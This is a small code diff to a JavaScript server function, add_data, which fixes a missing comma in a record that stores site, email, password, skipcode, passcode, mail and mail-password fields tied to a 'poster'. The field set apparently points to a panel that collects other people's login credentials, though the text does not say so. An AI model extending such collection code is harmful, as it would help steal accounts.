@@ -307,7 +307,7 @@ export const add_data = async (req, res) => {
         if (userFound && posterFound) {
             const info = await Info.create({
                 site, email, password, skipcode,
-                username,passcode,mail,mailPass,adminId:adminId
+                username,passcode,mail,mailPass,adminId:adminId,
                 poster: posterId,
                 root: posterFound._id
 
